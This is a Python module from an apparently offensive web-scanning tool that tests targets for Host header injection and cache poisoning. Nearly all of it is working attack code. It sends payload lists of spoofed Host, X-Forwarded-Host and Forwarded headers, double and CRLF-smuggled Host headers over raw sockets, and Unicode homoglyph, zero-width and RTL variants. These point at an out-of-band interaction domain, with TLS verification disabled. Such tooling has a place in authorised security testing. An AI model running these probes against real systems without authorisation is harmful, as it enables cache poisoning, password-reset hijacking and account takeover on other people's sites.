#!/usr/bin/env python3
import sys
sys.dont_write_bytecode = True
from utils.style import Colors
from utils.utils import (
    requests,
    parse_headers,
    urllib3,
    urlparse,
    re,
    traceback,
    get_domain_from_url,
    json,
    CANARY,
    human_time
)
from utils.requests_settings import _raw_request



def _send_double_host(original_host, human, port, use_ssl, path, method, body, headers, interactdom, canary_ua, timeout=10):
    """
    Double Host header + space-prefixed header smuggling via raw socket.
    """
    results = []

    double_host_cases = [
        [("Host", original_host), ("Host", interactdom)],
        [("Host", interactdom), ("Host", original_host)],
        [("Host", original_host), (" Host", interactdom)],
        [("Host", original_host), ("\tHost", interactdom)],
        [("Host", original_host), (" X-Forwarded-Host", interactdom)],
        [("Host", f"{original_host}\r\n {interactdom}")],
        [("Host", f"{original_host}\r\n\t{interactdom}")],
    ]

    for host_combo in double_host_cases:
        try:
            request_line = f"{method} {path} HTTP/1.1\r\n"

            raw_headers = ""
            for hname, hval in host_combo:
                raw_headers += f"{hname}: {hval}\r\n"

            for k, v in headers.items():
                if k.lower() == "host":
                    continue
                if k.lower() == "user-agent":
                    raw_headers += f"{k}: {canary_ua}\r\n"
                else:
                    raw_headers += f"{k}: {v}\r\n"

            body_bytes = body.encode() if isinstance(body, str) else (body or b"")
            if body_bytes:
                raw_headers += f"Content-Length: {len(body_bytes)}\r\n"

            human_time(human)
            raw_req = (request_line + raw_headers + "\r\n").encode() + body_bytes
            raw_resp = _raw_request(original_host, port, raw_req, use_ssl=use_ssl, timeout=timeout)
            payload_desc = {h[0]: h[1] for h in host_combo}
            results.append((payload_desc, raw_resp))

        except Exception as e:
            payload_desc = {h[0]: h[1] for h in host_combo}
            print(f"  {Colors.RED}[!] double-host error ({payload_desc}): {e}{Colors.RESET}")

    return results


def _build_unicode_payloads(original_host, interactdom):
    """
    Build unicode-based Host header payloads.
    Returns list of (header_name, header_value) tuples.
    """
    UNICODE_DOTS = ["\u3002", "\uFF0E", "\u2027", "\u2024"]

    ZWCHARS = ["\u200B", "\u200C", "\u200D", "\uFEFF", "\u00AD", "\u034F", "\u2060"]

    HOMOGLYPHS = [
        ("a", "\u0430"), ("e", "\u0435"), ("o", "\u043E"), ("i", "\u0456"),
        ("c", "\u0441"), ("p", "\u0440"), ("s", "\u0455"), ("t", "\u0442"),
    ]

    UNICODE_HOST_NAMES = [
        "\uFF28\uFF4F\uFF53\uFF54",   # Ｈｏｓｔ
        "H\u03BFst",                    # Hοst
        "\u041Dost",                    # Ноst
        "Ho\u0455t",                    # Hoѕt
        "Hos\u0442",                    # Hosт
    ]

    RTL_CHARS = ["\u202E", "\u202A", "\u200F"]

    payloads = []
    interactdom_parts = interactdom.split(".")

    # Unicode dots in interactdom
    if len(interactdom_parts) >= 2:
        for udot in UNICODE_DOTS:
            payloads.append(("Host", udot.join(interactdom_parts)))

    # Unicode dots between original_host and interactdom
    if len(interactdom_parts) >= 2:
        for udot in UNICODE_DOTS:
            payloads.append(("Host", f"{original_host}{udot}{interactdom}"))

    # Zero-width chars injected in interactdom
    for zw in ZWCHARS:
        payloads.append(("Host", interactdom[0] + zw + interactdom[1:]))
        payloads.append(("Host", interactdom.replace(".", f"{zw}.", 1)))

    # Zero-width chars between original_host and interactdom
    for zw in ZWCHARS:
        payloads.append(("Host", f"{original_host}{zw}.{interactdom}"))

    # Homoglyphs on original_host
    for char_orig, char_repl in HOMOGLYPHS:
        if char_orig in original_host:
            payloads.append(("Host", original_host.replace(char_orig, char_repl, 1)))

    # Homoglyphs on interactdom
    for char_orig, char_repl in HOMOGLYPHS:
        if char_orig in interactdom:
            payloads.append(("Host", interactdom.replace(char_orig, char_repl, 1)))

    # Unicode "Host" header names
    for uhost_name in UNICODE_HOST_NAMES:
        payloads.append((uhost_name, interactdom))

    # RTL/directional prefix
    for rtl in RTL_CHARS:
        payloads.append(("Host", f"{rtl}{interactdom}"))
        payloads.append(("Host", f"{original_host}{rtl}{interactdom}"))

    return payloads


def _send_unicode_payloads(original_host, human, port, use_ssl, path, method, body, headers, interactdom, canary_ua, unicode_payloads, timeout=10):
    """
    Send unicode Host payloads via raw socket.
    """
    results = []

    for header_name, header_value in unicode_payloads:
        try:
            raw_headers = ""
            for k, v in headers.items():
                if k.lower() == "host":
                    continue
                if k.lower() == "user-agent":
                    raw_headers += f"{k}: {canary_ua}\r\n"
                else:
                    raw_headers += f"{k}: {v}\r\n"

            body_bytes = body.encode("utf-8") if isinstance(body, str) else (body or b"")
            if body_bytes:
                raw_headers += f"Content-Length: {len(body_bytes)}\r\n"

            request_line = f"{method} {path} HTTP/1.1\r\n"
            host_line = f"{header_name}: {header_value}\r\n"
            raw_req = (request_line + host_line + raw_headers + "\r\n").encode("utf-8") + body_bytes
            human_time(human)
            raw_resp = _raw_request(original_host, port, raw_req, use_ssl=use_ssl, timeout=timeout)
            payloads_info = {header_name: header_value}
            results.append((payloads_info, raw_resp))

        except Exception:
            pass

    return results


def hhip(url, human, parsed_req, baseline, interact, proxy=None):
    """
    Host Header Injection Poisoning
    """
    print(f"{Colors.CYAN} ├ HHIP analysis{Colors.RESET}")
    interactdom = get_domain_from_url(interact)
    original_host = parsed_req["host"]
    method = parsed_req["method"]
    path = parsed_req["path"]
    body = parsed_req["body"]
    headers = dict(parsed_req["headers"])

    scheme = urlparse(url).scheme
    use_ssl = scheme == "https"

    port = 443 if use_ssl else 80
    uri = f"{scheme}://{original_host}{path}"
    proxies = {"http": proxy, "https": proxy} if proxy else None

    canary_ua = None

    for h in headers:
        if h.lower() == "user-agent":
            canary_ua = f"{headers[h]}-{CANARY}"
            headers[h] = canary_ua
    if not canary_ua:
        canary_ua = f"Mozilla/5.0-{CANARY}"

    # --- Phase 1: Standard header injection payloads (via requests) ---
    print(f"{Colors.CYAN} └─ Standard header injection{Colors.RESET}")
    hhi_payloads = [
        {"Host": interactdom},
        {"Host": interact},
        {"Host": f"{interactdom}\\.{original_host}"},
        {"Host": f"{original_host}.{interactdom}"},
        {"Host": f"{interactdom}%00{original_host}"},
        {"Host": f"{interactdom}%09{original_host}"},
        {"Host": f"{original_host}@{interactdom}"},
        {"Host": f"{original_host}%23{interactdom}"},
        {"Host": f"{original_host}:{interactdom}"},
        {"Host": f"{original_host}#@{interactdom}"},
        {"Host": f"{interactdom}%.{original_host}"},
        {"X-Forwarded-For": interactdom},
        {"X-Forwarded-Host": interactdom},
        {"X-Client-IP": interactdom},
        {"X-Remote-IP": interactdom},
        {"X-Remote-Addr": interactdom},
        {"X-Host": interactdom},
        {"X-Original-URL": interact},
        {"Forwarded": f"host={interactdom}"},
    ]

    for hhi_p in hhi_payloads:
        header_inj = headers.copy()
        header_inj.update(hhi_p)
        try:
            human_time(human)
            resp_hhi = requests.request(
                method=method, url=uri, headers=header_inj,
                data=body or None, verify=False, allow_redirects=False,
                timeout=10, proxies=proxies,
            )
            _check_response(resp_hhi, interactdom, baseline, hhi_p, interact, CANARY, path)
        except requests.RequestException as e:
            print(f"  {Colors.RED}[!] request error: {e}{Colors.RESET}")

    # --- Phase 2: Double Host headers (raw socket) ---
    print(f"{Colors.BLUE} └─ Double Host headers{Colors.RESET}")
    dh_results = _send_double_host(
        original_host, human, port, use_ssl, path, method, body,
        headers, interactdom, canary_ua
    )
    for payload_desc, raw_resp in dh_results:
        _check_raw_response(raw_resp, interactdom, baseline, payload_desc, interact, CANARY, path)

    # --- Phase 3: Unicode Host injection (raw socket) ---
    print(f"{Colors.BLUE} └─ Unicode Host injection{Colors.RESET}")
    unicode_payloads = _build_unicode_payloads(original_host, interactdom)
    unicode_results = _send_unicode_payloads(
        original_host, human, port, use_ssl, path, method, body,
        headers, interactdom, canary_ua, unicode_payloads
    )
    for payload_info, raw_resp in unicode_results:
        _check_raw_response(raw_resp, interactdom, baseline, payload_info, interact, CANARY, path)


def _check_response(resp, interactdom, baseline, payload, interact, canary, path):
    """Check a requests.Response for HHI indicators."""
    if interactdom in resp.text:
        print(f"{Colors.GREEN}   └── [+] {interactdom} reflected in body | PAYLOAD: {payload}{Colors.RESET}")
    resp_headers_str = str(resp.headers)
    if interactdom in resp_headers_str:
        print(f"{Colors.GREEN}   └── [+] {interactdom} reflected in headers | PAYLOAD: {payload}{Colors.RESET}")
    if resp.status_code != baseline['status'] and resp.status_code not in [400, 403]:
        print(f"{Colors.YELLOW}   └──  [STATUS {resp.status_code} ≠ BASELINE {baseline['status']}] {Colors.RESET}| PAYLOAD: {payload}")
    if resp.status_code == baseline['status'] and len(resp.content) != baseline['body_length']:
        print(f"{Colors.YELLOW}   └──  [LENGTH {len(resp.content)}b ≠ BASELINE {baseline['body_length']}b] {Colors.RESET}| PAYLOAD: {payload}")
    try:
        req_interact = requests.get(interact, verify=False, allow_redirects=False, timeout=10)
        if req_interact.status_code == 200:
            if canary in req_interact.text:
                print(f"{Colors.GREEN}   └── [+] canary '{canary}' caught on {interact} {Colors.RESET}| PAYLOAD: {payload}")
            if path in req_interact.text:
                print(f"{Colors.GREEN}   └── [+] path '{path}' caught on {interact} {Colors.RESET}| PAYLOAD:  {payload}")
    except requests.RequestException:
        pass


def _check_raw_response(raw_resp, interactdom, baseline, payload, interact, canary, path):
    """Check a raw socket response string for HHI indicators."""
    if interactdom in raw_resp:
        print(f"{Colors.GREEN}   └── [+] {interactdom} reflected in raw response {Colors.RESET}| PAYLOAD: {payload}")

    status_match = re.search(r"HTTP/[\d.]+ (\d{3})", raw_resp)
    if status_match:
        status_code = int(status_match.group(1))
        if status_code != baseline['status'] and status_code not in [400, 403]:
            print(f"{Colors.YELLOW}   └── [STATUS {status_code} ≠ BASELINE {baseline['status']}] {Colors.RESET}| PAYLOAD: {payload}")

    try:
        req_interact = requests.get(interact, verify=False, allow_redirects=False, timeout=10)
        if req_interact.status_code == 200:
            if canary in req_interact.text:
                print(f"{Colors.GREEN}   └── [+] canary '{canary}' caught on {interact} {Colors.RESET}| PAYLOAD: {payload}")
            if path in req_interact.text:
                print(f"{Colors.GREEN}   └── [+] path '{path}' caught on {interact} {Colors.RESET}| PAYLOAD: {payload}")
    except requests.RequestException:
        pass